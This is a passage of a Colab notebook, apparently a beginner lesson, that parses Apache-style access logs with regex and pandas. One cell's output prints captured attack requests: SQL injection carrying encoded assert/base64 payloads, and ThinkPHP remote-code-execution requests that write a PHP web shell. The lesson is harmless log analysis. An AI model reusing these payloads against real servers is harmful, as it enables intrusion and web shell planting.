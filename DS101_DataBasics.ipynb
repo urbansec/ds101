{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "DS101_DataBasics.ipynb",
      "version": "0.3.2",
      "provenance": [],
      "collapsed_sections": [],
      "toc_visible": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "metadata": {
        "id": "anje91qHZBHD",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# Get Set Up"
      ]
    },
    {
      "metadata": {
        "id": "hTAlb_J_Zxsp",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Import Libraries"
      ]
    },
    {
      "metadata": {
        "id": "Yu_GGlGJZMJ_",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Pandas provides an extremely useful data structure\n",
        "import pandas as pd\n",
        "\n",
        "# RE provides regular expression pattern matching\n",
        "import re\n",
        "\n",
        "# datetime provides a datetime object class and conversion utilities\n",
        "from datetime import datetime\n",
        "\n",
        "# Web file access\n",
        "from urllib.request import urlopen\n",
        "\n",
        "# Google tools\n",
        "from google.colab import drive\n",
        "\n",
        "\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "CHGVznn_5Z6_",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Define Some Functions"
      ]
    },
    {
      "metadata": {
        "id": "EG3BBk8Q5eF6",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "def log_ReadFile(logfile):\n",
        "  with open(logfile) as fh:\n",
        "    loglines = fh.readlines()\n",
        "  loglines = [line.strip() for line in loglines]\n",
        "  return loglines\n",
        "\n",
        "\n",
        "def log_ReadURL(logfile):\n",
        "  loglines = urlopen(logfile).readlines()\n",
        "  loglines = [line.decode().strip() for line in loglines]\n",
        "  return loglines"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "RHJ-2OMwbKpW",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Load Data"
      ]
    },
    {
      "metadata": {
        "id": "wr_QkeyDbWaB",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Define vars\n",
        "access_url = \"https://raw.githubusercontent.com/flarmy/ds101/master/access.log.2019-03-22\"\n",
        "error_url = \"https://raw.githubusercontent.com/flarmy/ds101/master/error.log.2019-03-22\"\n",
        "\n",
        "# Read log files into lists\n",
        "access_logs = log_ReadURL(access_url)\n",
        "error_logs = log_ReadURL(error_url)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "JR_G-c6eDAQJ",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# Examine Data"
      ]
    },
    {
      "metadata": {
        "id": "F62iveOjC_zx",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Web Server Access Logs"
      ]
    },
    {
      "metadata": {
        "id": "WdX0RUiDC-Wy",
        "colab_type": "code",
        "outputId": "0c9382e5-da33-4eef-d120-1c36a8b0bc75",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "cell_type": "code",
      "source": [
        "# check our data type\n",
        "type(access_logs)"
      ],
      "execution_count": 31,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "list"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 31
        }
      ]
    },
    {
      "metadata": {
        "id": "Z-oS2LE2DwlL",
        "colab_type": "code",
        "outputId": "e1a640c1-b722-4c50-ff06-55ba10ad346d",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "cell_type": "code",
      "source": [
        "# check data type of lists members\n",
        "type(access_logs[0])"
      ],
      "execution_count": 32,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "str"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 32
        }
      ]
    },
    {
      "metadata": {
        "id": "9eV9_8H_6Lyg",
        "colab_type": "code",
        "outputId": "0cde0e75-60d6-4b4b-ff54-a99cc4896ca5",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 122
        }
      },
      "cell_type": "code",
      "source": [
        "# display first 5 lines in list\n",
        "display(access_logs[:5])"
      ],
      "execution_count": 33,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "['101.89.29.92 - - [22/Mar/2019:01:55:15 -0700] \"GET / HTTP/1.1\" 200 46424 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en\"',\n",
              " '54.36.148.43 - - [22/Mar/2019:01:57:37 -0700] \"GET /self.logs/2015/access.log.2015-05-08.gz HTTP/1.1\" 200 4813 \"-\" \"Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)\"',\n",
              " '54.36.148.18 - - [22/Mar/2019:01:58:55 -0700] \"GET /self.logs/error.log.2016-04-07.gz HTTP/1.1\" 404 284 \"-\" \"Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)\"',\n",
              " '54.36.148.62 - - [22/Mar/2019:02:04:26 -0700] \"GET /self.logs/access.log.2016-10-30.gz HTTP/1.1\" 404 284 \"-\" \"Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)\"',\n",
              " '54.36.149.57 - - [22/Mar/2019:02:04:51 -0700] \"GET /self.logs/2016/error.log.2016-05-19.gz HTTP/1.1\" 200 867 \"-\" \"Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)\"']"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "Wl8Nr-pJOlXM",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# Parse Data"
      ]
    },
    {
      "metadata": {
        "id": "kQfzFKX0OoNn",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Web Server Access Logs"
      ]
    },
    {
      "metadata": {
        "id": "ZO5vSqMTRShL",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Regular expressions can be used to flexibly parse each line of the log file into separate fields based on a pattern.\n",
        "For more info on regular expressions, check out the re library documentation\n",
        "https://docs.python.org/3/library/re.html"
      ]
    },
    {
      "metadata": {
        "id": "IhsCRLpBFp_y",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# define a regex pattern to parse lines into fields\n",
        "# sample line:\n",
        "# ['54.36.148.18 - - [22/Mar/2019:01:58:55 -0700] \"GET /self.logs/error.log.2016-04-07.gz HTTP/1.1\" 404 284 \"-\" \"Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)\"']\n",
        "web_access_pattern = re.compile('(?P<client_ip>\\S+)'\n",
        "                                '\\s+(?P<identity>\\S+)'\n",
        "                                '\\s+(?P<username>\\S+)'\n",
        "                                '\\s+\\[(?P<date>[^\\]]+)\\]'\n",
        "                                '\\s+\\\"(?P<request>[^\"]+)\\\"'\n",
        "                                '\\s+(?P<http_response>\\d+)'\n",
        "                                '\\s+(?P<bytes>\\d+)'\n",
        "                                '\\s+\\\"(?P<something_else>[^\"]+)\\\"'\n",
        "                                '\\s+\\\"(?P<user_agent>.*)')\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "7z8DJ3p_FprP",
        "colab_type": "code",
        "outputId": "c90c6c40-5ac0-4b6e-82fd-f53fa4d83e65",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 190
        }
      },
      "cell_type": "code",
      "source": [
        "# test pattern on the first line of the log file to make sure it works\n",
        "match = web_access_pattern.match(access_logs[0])\n",
        "if match:\n",
        "  display(match.group('client_ip'))\n",
        "  display(match.group('identity'))\n",
        "  display(match.group('username'))\n",
        "  display(match.group('date'))\n",
        "  display(match.group('request'))\n",
        "  display(match.group('http_response'))\n",
        "  display(match.group('bytes'))\n",
        "  display(match.group('something_else'))\n",
        "  display(match.group('user_agent'))\n",
        "else:\n",
        "  display(\"parsing failed for\")\n",
        "  display(access_logs[0])"
      ],
      "execution_count": 35,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'101.89.29.92'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'-'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'-'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'22/Mar/2019:01:55:15 -0700'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'GET / HTTP/1.1'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'200'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'46424'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'-'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en\"'"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "wiJZM-0KAvyt",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Once the regex parses each field correctly, use it to parse each line.  Add functionality to display lines that are not parsed correctly."
      ]
    },
    {
      "metadata": {
        "id": "79862H3QA-Av",
        "colab_type": "code",
        "outputId": "ca4e07af-381a-40fc-fc80-ad1464ae7a3d",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 241
        }
      },
      "cell_type": "code",
      "source": [
        "access_logs_parsed = []  # create an empty list\n",
        "for line in access_logs:\n",
        "  match = web_access_pattern.match(line)\n",
        "  if match:\n",
        "    access_logs_parsed.append([match.group('date'), \n",
        "                               match.group('client_ip'), \n",
        "                               match.group('request'), \n",
        "                               match.group('http_response'), \n",
        "                               match.group('bytes'), \n",
        "                               match.group('something_else'), \n",
        "                               match.group('user_agent')])\n",
        "  else:\n",
        "    display(line)\n",
        "    \n",
        "#display(access_log_parsed)"
      ],
      "execution_count": 36,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'123.129.224.7 - - [22/Mar/2019:02:35:31 -0700] \"GET /user.php?act=login HTTP/1.1\" 404 294 \"554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\\\\\"num\\\\\";s:288:\\\\\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:3:\\\\\"\\'/*\\\\\";}\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'123.129.224.7 - - [22/Mar/2019:02:35:32 -0700] \"GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=xarhm.php&content=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37 HTTP/1.1\" 200 46423 \"http://www.secrepo.com/?s=index/\\\\\\\\think\\\\\\\\template\\\\\\\\driver\\\\\\\\file/write&cacheFile=xarhm.php&content=<?php assert($_REQUEST[\\\\\"ysy\\\\\"]);?>ysydjsjxbei37\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'123.129.224.7 - - [22/Mar/2019:02:35:33 -0700] \"GET /user.php?act=login HTTP/1.1\" 404 294 \"45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\\\\\"num\\\\\";s:297:\\\\\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:11:\\\\\"-1\\' UNION/*\\\\\";}45ea207d7a2b68c49582d2d22adf953a\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'123.129.224.7 - - [22/Mar/2019:02:35:34 -0700] \"GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=dflii.php&vars%5B1%5D%5B%5D=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1\" 200 46423 \"http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=dflii.php&vars[1][]=<?php assert($_REQUEST[\\\\\"ysy\\\\\"]);?>ysydjsjxbei37$\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'134.159.86.163 - - [22/Mar/2019:02:44:00 -0700] \"GET //user.php?act=login HTTP/1.1\" 404 295 \"554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\\\\\"num\\\\\";s:280:\\\\\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a324d75634768774a79776e50443977614841675a585a686243676b5831425055315262593130704f79412f506e6834654363702729293b2f2f7d787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:3:\\\\\"\\'/*\\\\\";}\" \"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\"'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'134.159.86.163 - - [22/Mar/2019:09:05:04 -0700] \"GET //user.php?act=login HTTP/1.1\" 404 295 \"554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\\\\\"num\\\\\";s:280:\\\\\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a324d75634768774a79776e50443977614841675a585a686243676b5831425055315262593130704f79412f506e6834654363702729293b2f2f7d787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:3:\\\\\"\\'/*\\\\\";}\" \"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\"'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'171.11.205.240 - - [22/Mar/2019:22:34:19 -0700] \"GET /user.php?act=login HTTP/1.1\" 404 294 \"554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\\\\\"num\\\\\";s:288:\\\\\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:3:\\\\\"\\'/*\\\\\";}\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'171.11.205.240 - - [22/Mar/2019:22:34:20 -0700] \"GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=kdfai.php&content=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37 HTTP/1.1\" 200 46423 \"http://www.secrepo.com/?s=index/\\\\\\\\think\\\\\\\\template\\\\\\\\driver\\\\\\\\file/write&cacheFile=kdfai.php&content=<?php assert($_REQUEST[\\\\\"ysy\\\\\"]);?>ysydjsjxbei37\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'223.215.187.212 - - [23/Mar/2019:01:28:13 -0700] \"GET /user.php?act=login HTTP/1.1\" 404 294 \"554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\\\\\"num\\\\\";s:288:\\\\\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:3:\\\\\"\\'/*\\\\\";}\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'223.215.187.212 - - [23/Mar/2019:01:28:14 -0700] \"GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=tmdyx.php&content=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37 HTTP/1.1\" 200 46423 \"http://www.secrepo.com/?s=index/\\\\\\\\think\\\\\\\\template\\\\\\\\driver\\\\\\\\file/write&cacheFile=tmdyx.php&content=<?php assert($_REQUEST[\\\\\"ysy\\\\\"]);?>ysydjsjxbei37\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'223.215.187.212 - - [23/Mar/2019:01:28:28 -0700] \"GET /user.php?act=login HTTP/1.1\" 404 294 \"45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\\\\\"num\\\\\";s:297:\\\\\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:11:\\\\\"-1\\' UNION/*\\\\\";}45ea207d7a2b68c49582d2d22adf953a\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"'"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "'223.215.187.212 - - [23/Mar/2019:01:28:29 -0700] \"GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=fgchz.php&vars%5B1%5D%5B%5D=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1\" 200 46423 \"http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=fgchz.php&vars[1][]=<?php assert($_REQUEST[\\\\\"ysy\\\\\"]);?>ysydjsjxbei37$\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"'"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "uNXVzIPYFtJo",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Interesting - looks like parse errors are occuring for some attempted SQL Injection.  This is something we would explore, but since we're just developing some skills here, let's move on."
      ]
    },
    {
      "metadata": {
        "id": "Ry24UFOoX9wA",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# DataFrame"
      ]
    },
    {
      "metadata": {
        "id": "Fu3Zub4fd_8n",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Web Access Logs"
      ]
    },
    {
      "metadata": {
        "id": "1IsGiY2Ud6_B",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Examine the contents of our parsed data structure.  It's handy, but could be more efficient.  Convert to a Pandas dataframe so it's easier to work with."
      ]
    },
    {
      "metadata": {
        "id": "PJ8EG-REGHDG",
        "colab_type": "code",
        "outputId": "48a664c2-ddde-4ebd-dfd1-d451e30d86e4",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 156
        }
      },
      "cell_type": "code",
      "source": [
        "# display the first member of the access_logs_parsed list\n",
        "display(access_logs_parsed[0])"
      ],
      "execution_count": 37,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "['22/Mar/2019:01:55:15 -0700',\n",
              " '101.89.29.92',\n",
              " 'GET / HTTP/1.1',\n",
              " '200',\n",
              " '46424',\n",
              " '-',\n",
              " 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en\"']"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "OIpx3NOXGeVZ",
        "colab_type": "code",
        "outputId": "e3cbb728-8ac4-4451-928e-c8bbdb81396c",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 289
        }
      },
      "cell_type": "code",
      "source": [
        "# convert to Pandas dataframe and display it\n",
        "column_list = ['date', 'client_ip', 'request', 'http_response', 'bytes', 'something_else', 'user_agent']\n",
        "access_logs_df = pd.DataFrame.from_records(access_logs_parsed, columns=column_list)\n",
        "display(access_logs_df.head())"
      ],
      "execution_count": 38,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>date</th>\n",
              "      <th>client_ip</th>\n",
              "      <th>request</th>\n",
              "      <th>http_response</th>\n",
              "      <th>bytes</th>\n",
              "      <th>something_else</th>\n",
              "      <th>user_agent</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>22/Mar/2019:01:55:15 -0700</td>\n",
              "      <td>101.89.29.92</td>\n",
              "      <td>GET / HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>46424</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>22/Mar/2019:01:57:37 -0700</td>\n",
              "      <td>54.36.148.43</td>\n",
              "      <td>GET /self.logs/2015/access.log.2015-05-08.gz H...</td>\n",
              "      <td>200</td>\n",
              "      <td>4813</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>22/Mar/2019:01:58:55 -0700</td>\n",
              "      <td>54.36.148.18</td>\n",
              "      <td>GET /self.logs/error.log.2016-04-07.gz HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>284</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>22/Mar/2019:02:04:26 -0700</td>\n",
              "      <td>54.36.148.62</td>\n",
              "      <td>GET /self.logs/access.log.2016-10-30.gz HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>284</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>22/Mar/2019:02:04:51 -0700</td>\n",
              "      <td>54.36.149.57</td>\n",
              "      <td>GET /self.logs/2016/error.log.2016-05-19.gz HT...</td>\n",
              "      <td>200</td>\n",
              "      <td>867</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                         date     client_ip  \\\n",
              "0  22/Mar/2019:01:55:15 -0700  101.89.29.92   \n",
              "1  22/Mar/2019:01:57:37 -0700  54.36.148.43   \n",
              "2  22/Mar/2019:01:58:55 -0700  54.36.148.18   \n",
              "3  22/Mar/2019:02:04:26 -0700  54.36.148.62   \n",
              "4  22/Mar/2019:02:04:51 -0700  54.36.149.57   \n",
              "\n",
              "                                             request http_response  bytes  \\\n",
              "0                                     GET / HTTP/1.1           200  46424   \n",
              "1  GET /self.logs/2015/access.log.2015-05-08.gz H...           200   4813   \n",
              "2    GET /self.logs/error.log.2016-04-07.gz HTTP/1.1           404    284   \n",
              "3   GET /self.logs/access.log.2016-10-30.gz HTTP/1.1           404    284   \n",
              "4  GET /self.logs/2016/error.log.2016-05-19.gz HT...           200    867   \n",
              "\n",
              "  something_else                                         user_agent  \n",
              "0              -  Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like...  \n",
              "1              -  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  \n",
              "2              -  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  \n",
              "3              -  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  \n",
              "4              -  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  "
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "x1JOwVYdcOqX",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Check out what data type each column is defined as using DataFrame.dtypes attribute"
      ]
    },
    {
      "metadata": {
        "id": "3ZRPs17LcaDP",
        "colab_type": "code",
        "outputId": "1f025188-9cb7-46d8-9169-7666023e6190",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 153
        }
      },
      "cell_type": "code",
      "source": [
        "display(access_logs_df.dtypes)"
      ],
      "execution_count": 39,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "date              object\n",
              "client_ip         object\n",
              "request           object\n",
              "http_response     object\n",
              "bytes             object\n",
              "something_else    object\n",
              "user_agent        object\n",
              "dtype: object"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "4cNmRMZmOY14",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Subset / Select"
      ]
    },
    {
      "metadata": {
        "id": "3zht0YQMPHpz",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Select a subset of columns"
      ]
    },
    {
      "metadata": {
        "id": "JDV1CvjHPMTm",
        "colab_type": "code",
        "outputId": "00680e50-1235-43e5-a866-f383b8f6cf22",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 204
        }
      },
      "cell_type": "code",
      "source": [
        "display(access_logs_df[['date', 'client_ip', 'http_response']].head())"
      ],
      "execution_count": 40,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>date</th>\n",
              "      <th>client_ip</th>\n",
              "      <th>http_response</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>22/Mar/2019:01:55:15 -0700</td>\n",
              "      <td>101.89.29.92</td>\n",
              "      <td>200</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>22/Mar/2019:01:57:37 -0700</td>\n",
              "      <td>54.36.148.43</td>\n",
              "      <td>200</td>\n",
              "    </tr>\n",
              "    <tr>\n",
